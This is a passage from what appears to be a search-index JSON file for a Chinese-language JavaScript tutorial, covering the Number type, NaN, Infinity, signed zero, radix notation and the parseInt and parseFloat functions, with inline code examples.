1 2 3 4 5 6 7 var x = 0.5 ; for ( var i = 0 ; i < 25 ; i ++ ) { x = x * x ; } x // 0 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9 0.5 \u8fde\u7eed\u505a25\u6b21\u5e73\u65b9\uff0c\u7531\u4e8e\u6700\u540e\u7ed3\u679c\u592a\u63a5\u8fd10\uff0c\u8d85\u51fa\u4e86\u53ef\u8868\u793a\u7684\u8303\u56f4\uff0cJavaScript \u5c31\u76f4\u63a5\u5c06\u5176\u8f6c\u4e3a0\u3002 JavaScript \u63d0\u4f9b Number \u5bf9\u8c61\u7684 MAX_VALUE \u548c MIN_VALUE \u5c5e\u6027\uff0c\u8fd4\u56de\u53ef\u4ee5\u8868\u793a\u7684\u5177\u4f53\u7684\u6700\u5927\u503c\u548c\u6700\u5c0f\u503c\u3002 1 2 Number . MAX_VALUE // 1.7976931348623157e+308 Number . MIN_VALUE // 5e-324","title":"\u6570\u503c\u8303\u56f4"},{"location":"types/number/#_6","text":"JavaScript \u7684\u6570\u503c\u6709\u591a\u79cd\u8868\u793a\u65b9\u6cd5\uff0c\u53ef\u4ee5\u7528\u5b57\u9762\u5f62\u5f0f\u76f4\u63a5\u8868\u793a\uff0c\u6bd4\u5982 35 \uff08\u5341\u8fdb\u5236\uff09\u548c 0xFF \uff08\u5341\u516d\u8fdb\u5236\uff09\u3002 \u6570\u503c\u4e5f\u53ef\u4ee5\u91c7\u7528\u79d1\u5b66\u8ba1\u6570\u6cd5\u8868\u793a\uff0c\u4e0b\u9762\u662f\u51e0\u4e2a\u79d1\u5b66\u8ba1\u6570\u6cd5\u7684\u4f8b\u5b50\u3002 1 2 3 4 123e3 // 123000 123e-3 // 0.123 - 3.1E+12 .1e-23 \u79d1\u5b66\u8ba1\u6570\u6cd5\u5141\u8bb8\u5b57\u6bcd e \u6216 E \u7684\u540e\u9762\uff0c\u8ddf\u7740\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u8fd9\u4e2a\u6570\u503c\u7684\u6307\u6570\u90e8\u5206\u3002 \u4ee5\u4e0b\u4e24\u79cd\u60c5\u51b5\uff0cJavaScript \u4f1a\u81ea\u52a8\u5c06\u6570\u503c\u8f6c\u4e3a\u79d1\u5b66\u8ba1\u6570\u6cd5\u8868\u793a\uff0c\u5176\u4ed6\u60c5\u51b5\u90fd\u91c7\u7528\u5b57\u9762\u5f62\u5f0f\u76f4\u63a5\u8868\u793a\u3002 \uff081\uff09\u5c0f\u6570\u70b9\u524d\u7684\u6570\u5b57\u591a\u4e8e21\u4f4d\u3002 1 2 3 4 5 1234567890123456789012 // 1.2345678901234568e+21 123456789012345678901 // 123456789012345680000 \uff082\uff09\u5c0f\u6570\u70b9\u540e\u7684\u96f6\u591a\u4e8e5\u4e2a\u3002 1 2 3 4 5 6 // \u5c0f\u6570\u70b9\u540e\u7d27\u8ddf5\u4e2a\u4ee5\u4e0a\u7684\u96f6\uff0c // \u5c31\u81ea\u52a8\u8f6c\u4e3a\u79d1\u5b66\u8ba1\u6570\u6cd5 0.0000003 // 3e-7 // \u5426\u5219\uff0c\u5c31\u4fdd\u6301\u539f\u6765\u7684\u5b57\u9762\u5f62\u5f0f 0.000003 // 0.000003","title":"\u6570\u503c\u7684\u8868\u793a\u6cd5"},{"location":"types/number/#_7","text":"\u4f7f\u7528\u5b57\u9762\u91cf\uff08literal\uff09\u76f4\u63a5\u8868\u793a\u4e00\u4e2a\u6570\u503c\u65f6\uff0cJavaScript \u5bf9\u6574\u6570\u63d0\u4f9b\u56db\u79cd\u8fdb\u5236\u7684\u8868\u793a\u65b9\u6cd5\uff1a\u5341\u8fdb\u5236\u3001\u5341\u516d\u8fdb\u5236\u3001\u516b\u8fdb\u5236\u3001\u4e8c\u8fdb\u5236\u3002 \u5341\u8fdb\u5236\uff1a\u6ca1\u6709\u524d\u5bfc0\u7684\u6570\u503c\u3002 \u516b\u8fdb\u5236\uff1a\u6709\u524d\u7f00 0o \u6216 0O \u7684\u6570\u503c\uff0c\u6216\u8005\u6709\u524d\u5bfc0\u3001\u4e14\u53ea\u7528\u52300-7\u7684\u516b\u4e2a\u963f\u62c9\u4f2f\u6570\u5b57\u7684\u6570\u503c\u3002 \u5341\u516d\u8fdb\u5236\uff1a\u6709\u524d\u7f00 0x \u6216 0X \u7684\u6570\u503c\u3002 \u4e8c\u8fdb\u5236\uff1a\u6709\u524d\u7f00 0b \u6216 0B \u7684\u6570\u503c\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cJavaScript \u5185\u90e8\u4f1a\u81ea\u52a8\u5c06\u516b\u8fdb\u5236\u3001\u5341\u516d\u8fdb\u5236\u3001\u4e8c\u8fdb\u5236\u8f6c\u4e3a\u5341\u8fdb\u5236\u3002\u4e0b\u9762\u662f\u4e00\u4e9b\u4f8b\u5b50\u3002 1 2 3 0xff // 255 0o377 // 255 0b11 // 3 \u5982\u679c\u516b\u8fdb\u5236\u3001\u5341\u516d\u8fdb\u5236\u3001\u4e8c\u8fdb\u5236\u7684\u6570\u503c\u91cc\u9762\uff0c\u51fa\u73b0\u4e0d\u5c5e\u4e8e\u8be5\u8fdb\u5236\u7684\u6570\u5b57\uff0c\u5c31\u4f1a\u62a5\u9519\u3002 1 2 3 0 xzz // \u62a5\u9519 0 o88 // \u62a5\u9519 0 b22 // \u62a5\u9519 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5341\u516d\u8fdb\u5236\u51fa\u73b0\u4e86\u5b57\u6bcd z \u3001\u516b\u8fdb\u5236\u51fa\u73b0\u6570\u5b57 8 \u3001\u4e8c\u8fdb\u5236\u51fa\u73b0\u6570\u5b57 2 \uff0c\u56e0\u6b64\u62a5\u9519\u3002 \u901a\u5e38\u6765\u8bf4\uff0c\u6709\u524d\u5bfc0\u7684\u6570\u503c\u4f1a\u88ab\u89c6\u4e3a\u516b\u8fdb\u5236\uff0c\u4f46\u662f\u5982\u679c\u524d\u5bfc0\u540e\u9762\u6709\u6570\u5b57 8 \u548c 9 \uff0c\u5219\u8be5\u6570\u503c\u88ab\u89c6\u4e3a\u5341\u8fdb\u5236\u3002 1 2 0888 // 888 0777 // 511 \u524d\u5bfc0\u8868\u793a\u516b\u8fdb\u5236\uff0c\u5904\u7406\u65f6\u5f88\u5bb9\u6613\u9020\u6210\u6df7\u4e71\u3002ES5 \u7684\u4e25\u683c\u6a21\u5f0f\u548c ES6\uff0c\u5df2\u7ecf\u5e9f\u9664\u4e86\u8fd9\u79cd\u8868\u793a\u6cd5\uff0c\u4f46\u662f\u6d4f\u89c8\u5668\u4e3a\u4e86\u517c\u5bb9\u4ee5\u524d\u7684\u4ee3\u7801\uff0c\u76ee\u524d\u8fd8\u7ee7\u7eed\u652f\u6301\u8fd9\u79cd\u8868\u793a\u6cd5\u3002","title":"\u6570\u503c\u7684\u8fdb\u5236"},{"location":"types/number/#_8","text":"JavaScript \u63d0\u4f9b\u4e86\u51e0\u4e2a\u7279\u6b8a\u7684\u6570\u503c\u3002","title":"\u7279\u6b8a\u6570\u503c"},{"location":"types/number/#_9","text":"\u524d\u9762\u8bf4\u8fc7\uff0cJavaScript \u768464\u4f4d\u6d6e\u70b9\u6570\u4e4b\u4e2d\uff0c\u6709\u4e00\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u662f\u7b26\u53f7\u4f4d\u3002\u8fd9\u610f\u5473\u7740\uff0c\u4efb\u4f55\u4e00\u4e2a\u6570\u90fd\u6709\u4e00\u4e2a\u5bf9\u5e94\u7684\u8d1f\u503c\uff0c\u5c31\u8fde 0 \u4e5f\u4e0d\u4f8b\u5916\u3002 JavaScript \u5185\u90e8\u5b9e\u9645\u4e0a\u5b58\u57282\u4e2a 0 \uff1a\u4e00\u4e2a\u662f +0 \uff0c\u4e00\u4e2a\u662f -0 \uff0c\u533a\u522b\u5c31\u662f64\u4f4d\u6d6e\u70b9\u6570\u8868\u793a\u6cd5\u7684\u7b26\u53f7\u4f4d\u4e0d\u540c\u3002\u5b83\u4eec\u662f\u7b49\u4ef7\u7684\u3002 1 2 3 - 0 === + 0 // true 0 === - 0 // true 0 === + 0 // true \u51e0\u4e4e\u6240\u6709\u573a\u5408\uff0c\u6b63\u96f6\u548c\u8d1f\u96f6\u90fd\u4f1a\u88ab\u5f53\u4f5c\u6b63\u5e38\u7684 0 \u3002 1 2 3 4 + 0 // 0 - 0 // 0 ( - 0 ). toString () // '0' ( + 0 ). toString () // '0' \u552f\u4e00\u6709\u533a\u522b\u7684\u573a\u5408\u662f\uff0c +0 \u6216 -0 \u5f53\u4f5c\u5206\u6bcd\uff0c\u8fd4\u56de\u7684\u503c\u662f\u4e0d\u76f8\u7b49\u7684\u3002 1 ( 1 / + 0 ) === ( 1 / - 0 ) // false \u4e0a\u9762\u7684\u4ee3\u7801\u4e4b\u6240\u4ee5\u51fa\u73b0\u8fd9\u6837\u7ed3\u679c\uff0c\u662f\u56e0\u4e3a\u9664\u4ee5\u6b63\u96f6\u5f97\u5230 +Infinity \uff0c\u9664\u4ee5\u8d1f\u96f6\u5f97\u5230 -Infinity \uff0c\u8fd9\u4e24\u8005\u662f\u4e0d\u76f8\u7b49\u7684\uff08\u5173\u4e8e Infinity \u8be6\u89c1\u4e0b\u6587\uff09\u3002","title":"\u6b63\u96f6\u548c\u8d1f\u96f6"},{"location":"types/number/#nan","text":"\uff081\uff09\u542b\u4e49 NaN \u662f JavaScript \u7684\u7279\u6b8a\u503c\uff0c\u8868\u793a\u201c\u975e\u6570\u5b57\u201d\uff08Not a Number\uff09\uff0c\u4e3b\u8981\u51fa\u73b0\u5728\u5c06\u5b57\u7b26\u4e32\u89e3\u6790\u6210\u6570\u5b57\u51fa\u9519\u7684\u573a\u5408\u3002 1 5 - 'x' // NaN \u4e0a\u9762\u4ee3\u7801\u8fd0\u884c\u65f6\uff0c\u4f1a\u81ea\u52a8\u5c06\u5b57\u7b26\u4e32 x \u8f6c\u4e3a\u6570\u503c\uff0c\u4f46\u662f\u7531\u4e8e x \u4e0d\u662f\u6570\u503c\uff0c\u6240\u4ee5\u6700\u540e\u5f97\u5230\u7ed3\u679c\u4e3a NaN \uff0c\u8868\u793a\u5b83\u662f\u201c\u975e\u6570\u5b57\u201d\uff08 NaN \uff09\u3002 \u53e6\u5916\uff0c\u4e00\u4e9b\u6570\u5b66\u51fd\u6570\u7684\u8fd0\u7b97\u7ed3\u679c\u4f1a\u51fa\u73b0 NaN \u3002 1 2 3 Math . acos ( 2 ) // NaN Math . log ( - 1 ) // NaN Math . sqrt ( - 1 ) // NaN 0 \u9664\u4ee5 0 \u4e5f\u4f1a\u5f97\u5230 NaN \u3002 1 0 / 0 // NaN \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c NaN \u4e0d\u662f\u72ec\u7acb\u7684\u6570\u636e\u7c7b\u578b\uff0c\u800c\u662f\u4e00\u4e2a\u7279\u6b8a\u6570\u503c\uff0c\u5b83\u7684\u6570\u636e\u7c7b\u578b\u4f9d\u7136\u5c5e\u4e8e Number \uff0c\u4f7f\u7528 typeof \u8fd0\u7b97\u7b26\u53ef\u4ee5\u770b\u5f97\u5f88\u6e05\u695a\u3002 1 typeof NaN // 'number' \uff082\uff09\u8fd0\u7b97\u89c4\u5219 NaN \u4e0d\u7b49\u4e8e\u4efb\u4f55\u503c\uff0c\u5305\u62ec\u5b83\u672c\u8eab\u3002 1 NaN === NaN // false \u6570\u7ec4\u7684 indexOf \u65b9\u6cd5\u5185\u90e8\u4f7f\u7528\u7684\u662f\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\uff0c\u6240\u4ee5\u8be5\u65b9\u6cd5\u5bf9 NaN \u4e0d\u6210\u7acb\u3002 1 [ NaN ]. indexOf ( NaN ) // -1 NaN \u5728\u5e03\u5c14\u8fd0\u7b97\u65f6\u88ab\u5f53\u4f5c false \u3002 1 Boolean ( NaN ) // false NaN \u4e0e\u4efb\u4f55\u6570\uff08\u5305\u62ec\u5b83\u81ea\u5df1\uff09\u7684\u8fd0\u7b97\uff0c\u5f97\u5230\u7684\u90fd\u662f NaN \u3002 1 2 3 4 NaN + 32 // NaN NaN - 32 // NaN NaN * 32 // NaN NaN / 32 // NaN","title":"NaN"},{"location":"types/number/#infinity","text":"\uff081\uff09\u542b\u4e49 Infinity \u8868\u793a\u201c\u65e0\u7a77\u201d\uff0c\u7528\u6765\u8868\u793a\u4e24\u79cd\u573a\u666f\u3002\u4e00\u79cd\u662f\u4e00\u4e2a\u6b63\u7684\u6570\u503c\u592a\u5927\uff0c\u6216\u4e00\u4e2a\u8d1f\u7684\u6570\u503c\u592a\u5c0f\uff0c\u65e0\u6cd5\u8868\u793a\uff1b\u53e6\u4e00\u79cd\u662f\u975e0\u6570\u503c\u9664\u4ee50\uff0c\u5f97\u5230 Infinity \u3002 1 2 3 4 5 6 7 // \u573a\u666f\u4e00 Math . pow ( 2 , 1024 ) // Infinity // \u573a\u666f\u4e8c 0 / 0 // NaN 1 / 0 // Infinity \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e00\u4e2a\u573a\u666f\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u8ba1\u7b97\u7ed3\u679c\u592a\u5927\uff0c\u8d85\u51fa\u4e86\u80fd\u591f\u8868\u793a\u7684\u8303\u56f4\uff0c\u56e0\u6b64\u8fd4\u56de Infinity \u3002\u7b2c\u4e8c\u4e2a\u573a\u666f\u662f 0 \u9664\u4ee5 0 \u4f1a\u5f97\u5230 NaN \uff0c\u800c\u975e0\u6570\u503c\u9664\u4ee5 0 \uff0c\u4f1a\u8fd4\u56de Infinity \u3002 Infinity \u6709\u6b63\u8d1f\u4e4b\u5206\uff0c Infinity \u8868\u793a\u6b63\u7684\u65e0\u7a77\uff0c -Infinity \u8868\u793a\u8d1f\u7684\u65e0\u7a77\u3002 1 2 3 4 Infinity === - Infinity // false 1 / - 0 // -Infinity - 1 / - 0 // Infinity \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u975e\u96f6\u6b63\u6570\u9664\u4ee5 -0 \uff0c\u4f1a\u5f97\u5230 -Infinity \uff0c\u8d1f\u6570\u9664\u4ee5 -0 \uff0c\u4f1a\u5f97\u5230 Infinity \u3002 \u7531\u4e8e\u6570\u503c\u6b63\u5411\u6ea2\u51fa\uff08overflow\uff09\u3001\u8d1f\u5411\u6ea2\u51fa\uff08underflow\uff09\u548c\u88ab 0 \u9664\uff0cJavaScript \u90fd\u4e0d\u62a5\u9519\uff0c\u6240\u4ee5\u5355\u7eaf\u7684\u6570\u5b66\u8fd0\u7b97\u51e0\u4e4e\u6ca1\u6709\u53ef\u80fd\u629b\u51fa\u9519\u8bef\u3002 Infinity \u5927\u4e8e\u4e00\u5207\u6570\u503c\uff08\u9664\u4e86 NaN \uff09\uff0c -Infinity \u5c0f\u4e8e\u4e00\u5207\u6570\u503c\uff08\u9664\u4e86 NaN \uff09\u3002 1 2 Infinity > 1000 // true - Infinity < - 1000 // true Infinity \u4e0e NaN \u6bd4\u8f83\uff0c\u603b\u662f\u8fd4\u56de false \u3002 1 2 3 4 5 Infinity > NaN // false - Infinity > NaN // false Infinity < NaN // false - Infinity < NaN // false \uff082\uff09\u8fd0\u7b97\u89c4\u5219 Infinity \u7684\u56db\u5219\u8fd0\u7b97\uff0c\u7b26\u5408\u65e0\u7a77\u7684\u6570\u5b66\u8ba1\u7b97\u89c4\u5219\u3002 1 2 3 4 5 * Infinity // Infinity 5 - Infinity // -Infinity Infinity / 5 // Infinity 5 / Infinity // 0 0\u4e58\u4ee5 Infinity \uff0c\u8fd4\u56de NaN \uff1b0\u9664\u4ee5 Infinity \uff0c\u8fd4\u56de 0 \uff1b Infinity \u9664\u4ee50\uff0c\u8fd4\u56de Infinity \u3002 1 2 3 0 * Infinity // NaN 0 / Infinity // 0 Infinity / 0 // Infinity Infinity \u52a0\u4e0a\u6216\u4e58\u4ee5 Infinity \uff0c\u8fd4\u56de\u7684\u8fd8\u662f Infinity \u3002 1 2 Infinity + Infinity // Infinity Infinity * Infinity // Infinity Infinity \u51cf\u53bb\u6216\u9664\u4ee5 Infinity \uff0c\u5f97\u5230 NaN \u3002 1 2 Infinity - Infinity // NaN Infinity / Infinity // NaN Infinity \u4e0e null \u8ba1\u7b97\u65f6\uff0c null \u4f1a\u8f6c\u62100\uff0c\u7b49\u540c\u4e8e\u4e0e 0 \u7684\u8ba1\u7b97\u3002 1 2 3 null * Infinity // NaN null / Infinity // 0 Infinity / null // Infinity Infinity \u4e0e undefined \u8ba1\u7b97\uff0c\u8fd4\u56de\u7684\u90fd\u662f NaN \u3002 1 2 3 4 5 undefined + Infinity // NaN undefined - Infinity // NaN undefined * Infinity // NaN undefined / Infinity // NaN Infinity / undefined // NaN","title":"Infinity"},{"location":"types/number/#_10","text":"","title":"\u4e0e\u6570\u503c\u76f8\u5173\u7684\u5168\u5c40\u65b9\u6cd5"},{"location":"types/number/#parseint","text":"\uff081\uff09\u57fa\u672c\u7528\u6cd5 parseInt \u65b9\u6cd5\u7528\u4e8e\u5c06\u5b57\u7b26\u4e32\u8f6c\u4e3a\u6574\u6570\u3002 1 parseInt ( '123' ) // 123 \u5982\u679c\u5b57\u7b26\u4e32\u5934\u90e8\u6709\u7a7a\u683c\uff0c\u7a7a\u683c\u4f1a\u88ab\u81ea\u52a8\u53bb\u9664\u3002 1 parseInt ( ' 81' ) // 81 \u5982\u679c parseInt \u7684\u53c2\u6570\u4e0d\u662f\u5b57\u7b26\u4e32\uff0c\u5219\u4f1a\u5148\u8f6c\u4e3a\u5b57\u7b26\u4e32\u518d\u8f6c\u6362\u3002 1 2 3 parseInt ( 1.23 ) // 1 // \u7b49\u540c\u4e8e parseInt ( '1.23' ) // 1 \u5b57\u7b26\u4e32\u8f6c\u4e3a\u6574\u6570\u7684\u65f6\u5019\uff0c\u662f\u4e00\u4e2a\u4e2a\u5b57\u7b26\u4f9d\u6b21\u8f6c\u6362\uff0c\u5982\u679c\u9047\u5230\u4e0d\u80fd\u8f6c\u4e3a\u6570\u5b57\u7684\u5b57\u7b26\uff0c\u5c31\u4e0d\u518d\u8fdb\u884c\u4e0b\u53bb\uff0c\u8fd4\u56de\u5df2\u7ecf\u8f6c\u597d\u7684\u90e8\u5206\u3002 1 2 3 4 5 parseInt ( '8a' ) // 8 parseInt ( '12**' ) // 12 parseInt ( '12.34' ) // 12 parseInt ( '15e2' ) // 15 parseInt ( '15px' ) // 15 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c parseInt \u7684\u53c2\u6570\u90fd\u662f\u5b57\u7b26\u4e32\uff0c\u7ed3\u679c\u53ea\u8fd4\u56de\u5b57\u7b26\u4e32\u5934\u90e8\u53ef\u4ee5\u8f6c\u4e3a\u6570\u5b57\u7684\u90e8\u5206\u3002 \u5982\u679c\u5b57\u7b26\u4e32\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e0d\u80fd\u8f6c\u5316\u4e3a\u6570\u5b57\uff08\u540e\u9762\u8ddf\u7740\u6570\u5b57\u7684\u6b63\u8d1f\u53f7\u9664\u5916\uff09\uff0c\u8fd4\u56de NaN \u3002 1 2 3 4 5 parseInt ( 'abc' ) // NaN parseInt ( '.3' ) // NaN parseInt ( '' ) // NaN parseInt ( '+' ) // NaN parseInt ( '+1' ) // 1 \u6240\u4ee5\uff0c parseInt \u7684\u8fd4\u56de\u503c\u53ea\u6709\u4e24\u79cd\u53ef\u80fd\uff0c\u8981\u4e48\u662f\u4e00\u4e2a\u5341\u8fdb\u5236\u6574\u6570\uff0c\u8981\u4e48\u662f NaN \u3002 \u5982\u679c\u5b57\u7b26\u4e32\u4ee5 0x \u6216 0X \u5f00\u5934\uff0c parseInt \u4f1a\u5c06\u5176\u6309\u7167\u5341\u516d\u8fdb\u5236\u6570\u89e3\u6790\u3002 1 parseInt ( '0x10' ) // 16 \u5982\u679c\u5b57\u7b26\u4e32\u4ee5 0 \u5f00\u5934\uff0c\u5c06\u5176\u6309\u716710\u8fdb\u5236\u89e3\u6790\u3002 1 parseInt ( '011' ) // 11 \u5bf9\u4e8e\u90a3\u4e9b\u4f1a\u81ea\u52a8\u8f6c\u4e3a\u79d1\u5b66\u8ba1\u6570\u6cd5\u7684\u6570\u5b57\uff0c parseInt \u4f1a\u5c06\u79d1\u5b66\u8ba1\u6570\u6cd5\u7684\u8868\u793a\u65b9\u6cd5\u89c6\u4e3a\u5b57\u7b26\u4e32\uff0c\u56e0\u6b64\u5bfc\u81f4\u4e00\u4e9b\u5947\u602a\u7684\u7ed3\u679c\u3002 1 2 3 4 5 6 7 parseInt ( 1000000000000000000000.5 ) // 1 // \u7b49\u540c\u4e8e parseInt ( '1e+21' ) // 1 parseInt ( 0.0000008 ) // 8 // \u7b49\u540c\u4e8e parseInt ( '8e-7' ) // 8 \uff082\uff09\u8fdb\u5236\u8f6c\u6362 parseInt \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff082\u523036\u4e4b\u95f4\uff09\uff0c\u8868\u793a\u88ab\u89e3\u6790\u7684\u503c\u7684\u8fdb\u5236\uff0c\u8fd4\u56de\u8be5\u503c\u5bf9\u5e94\u7684\u5341\u8fdb\u5236\u6570\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c parseInt \u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a10\uff0c\u5373\u9ed8\u8ba4\u662f\u5341\u8fdb\u5236\u8f6c\u5341\u8fdb\u5236\u3002 1 2 3 parseInt ( '1000' ) // 1000 // \u7b49\u540c\u4e8e parseInt ( '1000' , 10 ) // 1000 \u4e0b\u9762\u662f\u8f6c\u6362\u6307\u5b9a\u8fdb\u5236\u7684\u6570\u7684\u4f8b\u5b50\u3002 1 2 3 parseInt ( '1000' , 2 ) // 8 parseInt ( '1000' , 6 ) // 216 parseInt ( '1000' , 8 ) // 512 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e8c\u8fdb\u5236\u3001\u516d\u8fdb\u5236\u3001\u516b\u8fdb\u5236\u7684 1000 \uff0c\u5206\u522b\u7b49\u4e8e\u5341\u8fdb\u5236\u76848\u3001216\u548c512\u3002\u8fd9\u610f\u5473\u7740\uff0c\u53ef\u4ee5\u7528 parseInt \u65b9\u6cd5\u8fdb\u884c\u8fdb\u5236\u7684\u8f6c\u6362\u3002 \u5982\u679c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e0d\u662f\u6570\u503c\uff0c\u4f1a\u88ab\u81ea\u52a8\u8f6c\u4e3a\u4e00\u4e2a\u6574\u6570\u3002\u8fd9\u4e2a\u6574\u6570\u53ea\u6709\u57282\u523036\u4e4b\u95f4\uff0c\u624d\u80fd\u5f97\u5230\u6709\u610f\u4e49\u7684\u7ed3\u679c\uff0c\u8d85\u51fa\u8fd9\u4e2a\u8303\u56f4\uff0c\u5219\u8fd4\u56de NaN \u3002\u5982\u679c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f 0 \u3001 undefined \u548c null \uff0c\u5219\u76f4\u63a5\u5ffd\u7565\u3002 1 2 3 4 5 parseInt ( '10' , 37 ) // NaN parseInt ( '10' , 1 ) // NaN parseInt ( '10' , 0 ) // 10 parseInt ( '10' , null ) // 10 parseInt ( '10' , undefined ) // 10 \u5982\u679c\u5b57\u7b26\u4e32\u5305\u542b\u5bf9\u4e8e\u6307\u5b9a\u8fdb\u5236\u65e0\u610f\u4e49\u7684\u5b57\u7b26\uff0c\u5219\u4ece\u6700\u9ad8\u4f4d\u5f00\u59cb\uff0c\u53ea\u8fd4\u56de\u53ef\u4ee5\u8f6c\u6362\u7684\u6570\u503c\u3002\u5982\u679c\u6700\u9ad8\u4f4d\u65e0\u6cd5\u8f6c\u6362\uff0c\u5219\u76f4\u63a5\u8fd4\u56de NaN \u3002 1 2 parseInt ( '1546' , 2 ) // 1 parseInt ( '546' , 2 ) // NaN \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u4e8e\u4e8c\u8fdb\u5236\u6765\u8bf4\uff0c 1 \u662f\u6709\u610f\u4e49\u7684\u5b57\u7b26\uff0c 5 \u3001 4 \u3001 6 \u90fd\u662f\u65e0\u610f\u4e49\u7684\u5b57\u7b26\uff0c\u6240\u4ee5\u7b2c\u4e00\u884c\u8fd4\u56de1\uff0c\u7b2c\u4e8c\u884c\u8fd4\u56de NaN \u3002 \u524d\u9762\u8bf4\u8fc7\uff0c\u5982\u679c parseInt \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e0d\u662f\u5b57\u7b26\u4e32\uff0c\u4f1a\u88ab\u5148\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002\u8fd9\u4f1a\u5bfc\u81f4\u4e00\u4e9b\u4ee4\u4eba\u610f\u5916\u7684\u7ed3\u679c\u3002 1 2 3 4 5 6 7 8 9 10 parseInt ( 0x11 , 36 ) // 43 parseInt ( 0x11 , 2 ) // 1 // \u7b49\u540c\u4e8e parseInt ( String ( 0x11 ), 36 ) parseInt ( String ( 0x11 ), 2 ) // \u7b49\u540c\u4e8e parseInt ( '17' , 36 ) parseInt ( '17' , 2 ) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5341\u516d\u8fdb\u5236\u7684 0x11 \u4f1a\u88ab\u5148\u8f6c\u4e3a\u5341\u8fdb\u5236\u768417\uff0c\u518d\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002\u7136\u540e\uff0c\u518d\u752836\u8fdb\u5236\u6216\u4e8c\u8fdb\u5236\u89e3\u8bfb\u5b57\u7b26\u4e32 17 \uff0c\u6700\u540e\u8fd4\u56de\u7ed3\u679c 43 \u548c 1 \u3002 \u8fd9\u79cd\u5904\u7406\u65b9\u5f0f\uff0c\u5bf9\u4e8e\u516b\u8fdb\u5236\u7684\u524d\u7f000\uff0c\u5c24\u5176\u9700\u8981\u6ce8\u610f\u3002 1 2 3 4 5 6 7 parseInt ( 011 , 2 ) // NaN // \u7b49\u540c\u4e8e parseInt ( String ( 011 ), 2 ) // \u7b49\u540c\u4e8e parseInt ( String ( 9 ), 2 ) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e00\u884c\u7684 011 \u4f1a\u88ab\u5148\u8f6c\u4e3a\u5b57\u7b26\u4e32 9 \uff0c\u56e0\u4e3a 9 \u4e0d\u662f\u4e8c\u8fdb\u5236\u7684\u6709\u6548\u5b57\u7b26\uff0c\u6240\u4ee5\u8fd4\u56de NaN \u3002\u5982\u679c\u76f4\u63a5\u8ba1\u7b97 parseInt('011', 2) \uff0c 011 \u5219\u662f\u4f1a\u88ab\u5f53\u4f5c\u4e8c\u8fdb\u5236\u5904\u7406\uff0c\u8fd4\u56de3\u3002 JavaScript \u4e0d\u518d\u5141\u8bb8\u5c06\u5e26\u6709\u524d\u7f000\u7684\u6570\u5b57\u89c6\u4e3a\u516b\u8fdb\u5236\u6570\uff0c\u800c\u662f\u8981\u6c42\u5ffd\u7565\u8fd9\u4e2a 0 \u3002\u4f46\u662f\uff0c\u4e3a\u4e86\u4fdd\u8bc1\u517c\u5bb9\u6027\uff0c\u5927\u90e8\u5206\u6d4f\u89c8\u5668\u5e76\u6ca1\u6709\u90e8\u7f72\u8fd9\u4e00\u6761\u89c4\u5b9a\u3002","title":"parseInt()"},{"location":"types/number/#parsefloat","text":"parseFloat \u65b9\u6cd5\u7528\u4e8e\u5c06\u4e00\u4e2a\u5b57\u7b26\u4e32\u8f6c\u4e3a\u6d6e\u70b9\u6570\u3002 1 parseFloat ( '3.14' ) // 3.14 \u5982\u679c\u5b57\u7b26\u4e32\u7b26\u5408\u79d1\u5b66\u8ba1\u6570\u6cd5\uff0c\u5219\u4f1a\u8fdb\u884c\u76f8\u5e94\u7684\u8f6c\u6362\u3002 1 2 parseFloat ( '314e-2' ) // 3.14 parseFloat ( '0.0314E+2' ) // 3.14 \u5982\u679c\u5b57\u7b26\u4e32\u5305\u542b\u4e0d\u80fd\u8f6c\u4e3a\u6d6e\u70b9\u6570\u7684\u5b57\u7b26\uff0c\u5219\u4e0d\u518d\u8fdb\u884c\u5f80\u540e\u8f6c\u6362\uff0c\u8fd4\u56de\u5df2\u7ecf\u8f6c\u597d\u7684\u90e8\u5206\u3002 1 parseFloat ( '3.14more non-digit characters' ) // 3.14 parseFloat \u65b9\u6cd5\u4f1a\u81ea\u52a8\u8fc7\u6ee4\u5b57\u7b26\u4e32\u524d\u5bfc\u7684\u7a7a\u683c\u3002 1 parseFloat ( '\\t\\v\\r12.34\\n ' ) // 12.34 \u5982\u679c\u53c2\u6570\u4e0d\u662f\u5b57\u7b26\u4e32\uff0c\u6216\u8005\u5b57\u7b26\u4e32\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e0d\u80fd\u8f6c\u5316\u4e3a\u6d6e\u70b9\u6570\uff0c\u5219\u8fd4\u56de NaN \u3002 1 2 3 parseFloat ([]) // NaN parseFloat ( 'FF2' ) // NaN parseFloat ( '' ) // NaN \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5c24\u5176\u503c\u5f97\u6ce8\u610f\uff0c parseFloat \u4f1a\u5c06\u7a7a\u5b57\u7b26\u4e32\u8f6c\u4e3a NaN \u3002 \u8fd9\u4e9b\u7279\u70b9\u4f7f\u5f97 parseFloat \u7684\u8f6c\u6362\u7ed3\u679c\u4e0d\u540c\u4e8e Number \u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 parseFloat ( true ) // NaN Number ( true ) // 1 parseFloat ( null ) // NaN Number ( null ) // 0 parseFloat ( '' 